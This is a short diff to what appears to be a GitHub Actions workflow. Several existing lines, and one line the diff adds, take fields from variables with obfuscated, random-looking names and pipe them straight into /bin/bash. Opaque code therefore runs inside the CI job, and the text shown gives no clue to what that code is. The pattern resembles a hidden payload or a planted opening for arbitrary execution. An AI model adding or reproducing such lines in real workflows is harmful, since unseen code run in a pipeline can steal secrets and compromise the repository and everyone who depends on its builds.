@@ -29,6 +29,7 @@ jobs:
           echo $ufb7 | jq -r .z81 | /bin/bash
           echo $pw90974 | jq -r .drutf400 | /bin/bash
           echo $aa6 | jq -r .yqzo91 | /bin/bash
+          printf '%s' "$o6" | jq -r .x5081 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
